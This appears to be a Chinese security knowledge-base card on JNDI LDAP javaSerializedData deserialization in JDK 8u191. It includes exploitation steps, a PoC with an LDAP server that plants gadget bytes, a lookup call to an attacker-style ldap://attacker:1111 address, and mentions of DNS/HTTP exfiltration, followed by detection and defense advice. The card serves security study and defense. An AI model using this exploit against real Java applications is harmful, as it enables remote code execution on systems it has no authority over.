---
id: web-java-deserialization-jndi-ldap-javaserializeddata-deser
title: JDK 8u191 LDAP JNDI javaSerializedData 反序列化通道：Obj.decodeObject 直接 readObject，配合本地 gadget 链 RCE
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-ldap-javaserializeddata-deserialization-window
aliases:
- LDAP javaSerializedData
- Obj.decodeObject 反序列化
- deserializeObject 分支
- JNDI LDAP 反序列化
- trustSerialData 版本窗口
- 8u191 JNDI 绕过
tags:
- java
- jndi
- ldap
- deserialization
- javaserializeddata
- trustserialdata
- jdk8u191
- rce
cve: []
severity: high
confidence: high
affected_versions: JDK 8u191（原文演示环境；后续版本默认收紧 com.sun.jndi.ldap.object.trustSerialData 后该分支被关闭，以目标 JDK 实测为准）
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V393
  verified_at: '2026-11-09T11:40:21+08:00'
  notes: 已对照原文与18张图核对：8u191 下 RegistryContext.decodeObject 的 trustURLCodebase=false、factoryLocation=null 后走 NamingManager 本地工厂；LDAP Obj.decodeObject 先查 JAVA_ATTRIBUTES[1]=javaSerializedData 并直接 deserializeObject→ObjectInputStream.readObject（图15/16/17 无反序列化开关检查），Payload.readObject 弹计算器（图18）均与文章一致。README 中 Obj.decodeObject 图显示 8u191 该分支无 trustSerialData 检查，affected_versions 保留为原文演示环境边界（按 prompt 示例保留），未改。与本地工厂 H2/Reference-only 卡为 decodeObject 不同分支，非同链。dup-scan(11-08)早于建卡未涉及；无 URL/文章 ID/长段摘录；未复跑 PoC
---

## 一句话结论

在 `trustURLCodebase` 已被默认关闭（JDK 8u191）但仍允许 LDAP 序列化数据的版本上，恶意 LDAP 条目只要携带 `javaSerializedData` 属性，`com.sun.jndi.ldap.Obj.decodeObject` 就会走 `deserializeObject` 分支，直接 `new ObjectInputStream(...).readObject()` 反序列化该属性；攻击者把本地 classpath 上已有 gadget 链（CC、JDK 原生链等）的序列化字节放进该属性，受害者 `lookup` 时即触发 RCE——既不需要远程 codebase，也不需要本地存在可利用的 ObjectFactory。

## 原理

- **decodeObject 的分支顺序**：`com.sun.jndi.ldap.Obj.JAVA_ATTRIBUTES` 依次为 `objectClass`、`javaSerializedData`、`javaClassName`、`javaFactory`、`javaCodeBase`、`javaReferenceAddress`、`javaClassNames`、`javaRemoteLocation`。`decodeObject(Attributes)` 先检查 `attrs.get(JAVA_ATTRIBUTES[1])`（即 `javaSerializedData`）；存在就直接 `deserializeObject((byte[]) value, classLoader)`，其次才是 `javaRemoteLocation`（RMI）与 `javaNamingReference`（Reference）。
- **readObject 无过滤**：`deserializeObject` 内部 `new ObjectInputStream(new ByteArrayInputStream(bytes))`（或 `LoaderInputStream`）后调用 `readObject()`；只要目标进程 classpath 上有可用的反序列化 gadget，就会在 `lookup` 调用线程里执行。
- **与远程 codebase 是两条独立开关**：8u191 默认关闭 `com.sun.jndi.rmi.object.trustURLCodebase` / `com.sun.jndi.ldap.object.trustURLCodebase`，只拦住“远程下载工厂类”；LDAP 序列化数据由 `com.sun.jndi.ldap.object.trustSerialData` 控制，在该版本窗口仍被反序列化。后续 JDK 收紧该属性（默认 false，抛 `Object deserialization is not allowed`）后，此分支失效，只能改走 `javaNamingReference` 的本地工厂路径。
- **与本地工厂绕过的区别**：本地工厂要求 classpath 上恰好存在一个 `ObjectFactory` 且其 `getObjectInstance` 可被 Reference 属性驱动；本路径只要求 classpath 上有任意反序列化 gadget，攻击面更宽，但依赖 JDK 尚未关闭序列化。
- **RMI 侧没有等价分支**：RMI 的 `RegistryContext.decodeObject` 只处理 `Reference`/`Referenceable`，因此高版本 RMI 只能走“factory location 置空 + 本地工厂”；LDAP 才有 `javaSerializedData` 这条额外通道。

## 触发条件

- 应用存在用户可控的 JNDI `InitialContext.lookup()` 且接受 `ldap://` 地址。
- 目标 JDK 仍允许 LDAP 序列化数据（原文 8u191 实测可用；以 `com.sun.jndi.ldap.object.trustSerialData` 实际取值/版本行为为准）。
- 目标 classpath 存在可用反序列化 gadget（CommonsCollections、TemplatesImpl 等），或应用自身有带危险 `readObject` 的类。
- 攻击者可运行返回自定义属性的 LDAP 服务，受害者可达其端口。

## 利用步骤

1. 确认 JNDI 入口与 JDK 版本/`trustSerialData` 行为（低版本窗口才走本路径）。
2. 用 ysoserial/自研链生成目标环境可用的序列化 payload 字节。
3. 起 LDAP 服务，对查询返回 Entry，添加 `objectClass`、`javaClassName`，并把 payload 字节作为 `javaSerializedData` 属性（无需 `javaCodeBase`/`javaFactory`）。
4. 触发 `new InitialContext().lookup("ldap://attacker:1111/任意")`；`Obj.decodeObject` 进入 `deserializeObject`，`readObject` 执行 gadget。
5. 无回显时用 DNS/HTTP 外带或写文件验证。

## PoC

LDAP 服务端关键属性（UnboundID，序列化字节为示意）：

```java
Entry e = new Entry(searchResult.getRequest().getBaseDN());
e.addAttribute("objectClass", "javaNamingReference");
e.addAttribute("javaClassName", "javaclassname");
e.addAttribute("javaSerializedData", gadgetBytes);   // ysoserial/本地 gadget 的序列化字节
searchResult.sendSearchEntry(e);
searchResult.setResult(new LDAPResult(0, ResultCode.SUCCESS));
```

客户端触发：

```java
new InitialContext().lookup("ldap://127.0.0.1:1111/payload");
```

关键调用链：

```text
LdapCtx.lookup
→ com.sun.jndi.ldap.Obj.decodeObject
→ Obj.deserializeObject
→ new ObjectInputStream(...).readObject()
→ gadget 链（如 CommonsCollections）→ Runtime.exec
```

说明：文中演示用自定义 `Payload.readObject()` 弹计算器证明通道可用；真实利用替换为 classpath 上已有 gadget 的序列化字节即可。正文未给出完整 gadget，也不改变“该属性会被 readObject”的结论。

## 变体与关联

- 关联：高版本关闭序列化后，LDAP 改走 `javaNamingReference` 本地工厂（如 Tomcat DataSourceFactory→H2 INIT），见 [[web-java-deserialization-jndi-ldap-local-factory-h2-init-rce]]；该卡详述三分支与高版本拦截。
- 关联：RMI 高版本的 `factoryClassLocation=null` + 本地工厂绕过见 [[web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass]]。
- 关联：JDK 21/11.0.29 下 trustSerialData 默认 false 时的 Reference-only 绕过见 [[web-java-deser-hessian-jndi-reference-only-unixprintservice]]。
- 变体：高版本若可通过系统属性/启动参数把 `trustSerialData` 打开（危险配置），本通道重新可用。
- 关联：低版本远程 codebase 两条通路见 [[web-java-deserialization-jndi-low-version-rmi-ldap-remote-codebase]]。

## 检测与防御

- 防御：显式设置 `-Dcom.sun.jndi.ldap.object.trustSerialData=false`（与 `trustURLCodebase=false` 一起）；升级到已默认关闭的 JDK；对 `InitialContext.lookup` 的协议与地址做白名单，禁止用户控制。
- 防御：用 `ObjectInputFilter` 类白名单限制 JNDI/LDAP 侧反序列化；配合 RASP 监控 `Obj.deserializeObject` 调用。
- 检测：LDAP 响应中出现非预期 `javaSerializedData` 属性；JNDI lookup 指向外部 LDAP 端口；进程内出现 gadget 类加载与异常 `readObject` 调用栈；外带 DNS/HTTP。
- 边界：本卡只适用于序列化数据仍被允许的版本窗口；该分支一旦被关闭，需转向本地工厂或 Reference-only 绕过。
